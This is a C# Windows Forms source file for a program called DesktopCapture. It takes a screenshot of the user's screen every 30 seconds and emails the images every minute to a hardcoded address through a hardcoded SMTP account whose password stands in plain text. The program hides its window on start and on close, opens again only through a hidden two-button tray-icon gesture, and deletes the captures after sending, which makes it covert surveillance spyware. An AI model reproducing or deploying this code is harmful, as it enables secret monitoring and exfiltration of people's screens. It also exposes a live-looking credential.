using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DesktopCapture.Properties;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Net.Mime;

namespace DesktopCapture
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            propGridControl.SelectedObject = Settings.Default;
            captureTimerControl.Interval = 30000;
            mailSendTimer.Interval = 60000;
            Settings.Default.Duration = TimeSpan.Parse("00:00:30");
            Settings.Default.MailSendDelay = TimeSpan.Parse("00:01:00");
            Settings.Default.Path = "c:\\temp";
            Settings.Default.LastSentFileNo = 0;
            Settings.Default.LastFileNo = 0;
            Settings.Default.UserName = "german.alvarez@sigmasig.net";
            Settings.Default.Password = "german.alvarez2011";
            Settings.Default.Smtp = "smtp.sigmasig.net";
            Settings.Default.To = "german.alvarez@sigmasig.net";
            Settings.Default.Save();
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Default.Save();
            this.Hide();
            e.Cancel = true;
        }

        private void captureTimerControl_Tick(object sender, EventArgs e)
        {
            // Set the bitmap object to the size of the screen
            //if (!Environment.UserName.ToLower().Contains(Settings.Default.AccountName.ToLower())) return;

            using (Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb))
            {
                // Create a graphics object from the bitmap

                using (Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot))
                {
                    try
                    {
                        Log("Capture screen");
                        // Take the screenshot from the upper left corner to the right bottom corner
                        gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

                        // Save the screenshot to the specified path that the user has chosen

                        //Get the ImageCodecInfo for the desired target format
                        ImageCodecInfo codec = GetEncoderInfo("image/jpeg");

                        // Set the quality to very low
                        System.Drawing.Imaging.Encoder qualityEncoder = System.Drawing.Imaging.Encoder.Quality;
                        EncoderParameter ratio = new EncoderParameter(qualityEncoder, 10L);
                        // Add the quality parameter to the list
                        EncoderParameters codecParams = new EncoderParameters(1);
                        codecParams.Param[0] = ratio;

                        string filePath = FilePath(Settings.Default.LastFileNo);
                        if (File.Exists(filePath)) File.Delete(filePath);

                        Log("Save file: " + filePath);

                        using (FileStream fs = new FileStream(filePath, FileMode.Create))
                        {
                            bmpScreenshot.Save(fs, codec, codecParams);
                            fs.Close();
                        }
                    }
                    catch (Exception x)
                    {
                        Log(x.ToString());
                        if (x is Win32Exception)
                        {
                            Log("Restarting...");
                            Application.Restart();
                        }
                    }
                    finally
                    {
                        Settings.Default.LastFileNo++;
                        Settings.Default.Save();
                    }
                }
            }

        }

        private string FilePath(int fileNo)
        {
            if (!Directory.Exists(Settings.Default.Path)) Directory.CreateDirectory(Settings.Default.Path);
            string userFolder = Path.Combine(Settings.Default.Path, Environment.UserName);
            if (!Directory.Exists(userFolder)) Directory.CreateDirectory(userFolder);

            string filePath = System.IO.Path.Combine(userFolder, "Capture" + fileNo.ToString() + ".jpg");

            return filePath;
        }

        private void Log(string msg)
        {
            string log = DateTime.Now.ToString() + '\t' + msg + '\n' ;

            string logFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Log.txt");
            File.AppendAllText("Log.txt", log);
        }

        private static ImageCodecInfo GetEncoderInfo(String mimeType)
        {
            int j;
            ImageCodecInfo[] encoders;
            encoders = ImageCodecInfo.GetImageEncoders();
            for (j = 0; j < encoders.Length; ++j)
            {
                if (encoders[j].MimeType == mimeType)
                    return encoders[j];
            } return null;
        }

        private void propGridControl_PropertyValueChanged(object s, PropertyValueChangedEventArgs e)
        {
            captureTimerControl.Interval = Convert.ToInt32(Settings.Default.Duration.TotalMilliseconds);

            Settings.Default.Save();
        }

        private void MainForm_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void mailSendTimer_Tick(object sender, EventArgs e)
        {
            Log("Start sending mail...");

            SmtpClient client = new SmtpClient(Settings.Default.Smtp);
            client.Credentials = new NetworkCredential(Settings.Default.UserName, Settings.Default.Password);

            MailMessage msg = new MailMessage(Settings.Default.To, Settings.Default.To);
            msg.Subject = DateTime.Now.ToString();
            msg.IsBodyHtml = true;

            StringBuilder body = new StringBuilder();

            List<LinkedResource> resources = new List<LinkedResource>();
            for (int i = Settings.Default.LastSentFileNo; i < Settings.Default.LastFileNo; i++)
            {
                try
                {
                    string filePath = FilePath(i); //System.IO.Path.Combine(Settings.Default.Path, "Capture" + i.ToString() + ".jpg");

                    //then we create the Html part
                    //to embed images, we need to use the prefix 'cid' in the img src value
                    //the cid value will map to the Content-Id of a Linked resource.
                    //thus <img src='cid:companylogo'> will map to a LinkedResource with a ContentId of 'companylogo'

                    body.AppendLine("<img src=cid:Capture" + i.ToString() + " />");

                    try
                    {
                        //create the LinkedResource (embedded image)
                        LinkedResource logo = new LinkedResource(filePath);
                        logo.ContentId = "Capture" + i.ToString();
                        //add the LinkedResource to the appropriate view
                        resources.Add(logo);
                    }
                    catch (Exception x)
                    {
                        Log(x.ToString());
                    }
                }
                catch (Exception x)
                {
                    Log( x.ToString());
                }
            }

            AlternateView htmlView = AlternateView.CreateAlternateViewFromString(body.ToString(), null, "text/html");

            foreach (LinkedResource resource in resources)
                htmlView.LinkedResources.Add(resource);

            msg.AlternateViews.Add(htmlView);

            try
            {
                client.Timeout = 10 * 60 * 1000;
                client.SendAsync(msg, "");
                System.Threading.Thread.Sleep(10000);
                client.SendCompleted += new SendCompletedEventHandler(client_SendCompleted);
                mailSendTimer.Stop();
                Log("Sending mail...");
            }
            catch (Exception x)
            {
                Log(x.ToString());
            }


            //eliminar fotos
            for (int i = 0; i < Settings.Default.LastFileNo; i++)
            {
                try
                {
                    string filePath = FilePath(i);
                    if (File.Exists(filePath))
                        File.Delete(filePath);
                }
                catch (Exception x)
                {
                    Log(x.ToString());
                }
            }


            Settings.Default.LastSentFileNo = Settings.Default.LastFileNo;
            Settings.Default.Save();
        }

        void client_SendCompleted(object sender, AsyncCompletedEventArgs e)
        {
            Log("Mail sent.");
                        
            mailSendTimer.Start();
            if (null != e.Error)
                Log(e.Error.ToString());
        }

        private void notifyIcon1_MouseUp(object sender, MouseEventArgs e)
        {
            if( e.Button == MouseButtons.Right)
            {
                if( _LeftButtonPressed && _RightButtonPressed )
                {                    
                    this.Show();                    
                }
                else
                {
                    _RightButtonPressed = false;
                }
            }
            else if( e.Button == MouseButtons.Left )
                _LeftButtonPressed = false;
        }

        private void notifyIcon1_MouseDown(object sender, MouseEventArgs e)
        {
            if( e.Button == MouseButtons.Left ) _LeftButtonPressed = true;
            if( e.Button == MouseButtons.Right ) _RightButtonPressed = true;
        }

        private bool _LeftButtonPressed = false;
        private bool _RightButtonPressed = false;
    }
}